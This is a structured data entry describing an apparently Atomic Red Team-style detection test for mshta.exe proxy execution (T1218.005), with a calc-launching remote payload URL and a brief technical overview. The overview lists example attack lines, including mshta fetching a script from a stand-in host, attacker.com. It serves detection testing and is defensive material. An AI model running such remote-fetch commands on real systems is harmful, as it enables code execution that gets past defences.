  terrain: "Implemented based on Detecting Mshta-based Proxy Execution via Suspicious\
    \ HTA or Script Invocation (AN1397).\n\nMshta executes JavaScript Scheme Fetch\
    \ Remote Payload With GetObject\nTest execution of a remote script using mshta.exe.\
    \ Upon execution calc.exe will be launched.\n\nSupported Platforms: Windows\n\n\
    Inputs\nName\tDescription\tType\tDefault Value\nfile_url\tlocation of the payload\t\
    url\thttps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct\n\
    \nTechnical Overview of T1218.005\nThe mshta.exe (Microsoft HTML Application Host)\
    \ utility is responsible for executing .hta files. These files are essentially\
    \ HTML documents that can include scripting languages like JavaScript (JScript)\
    \ or VBScript. Unlike scripts running in a standard browser, HTA files run with\
    \ the privileges of the user and are not restricted by the \"sandbox\" or \"Same-Origin\
    \ Policy.\"\n\nExecution Mechanism\nWhen mshta.exe is called, it initializes the\
    \ script engine specified in the source. Attackers often bypass the need for a\
    \ physical .hta file by passing the script directly via a URL or an inline protocol\
    \ handler:\n\nInline Execution: mshta.exe javascript:eval(\"...\")\n\nRemote Fetch:\
    \ mshta.exe http://attacker.com/payload.hta"
  viability: Roughly even chance
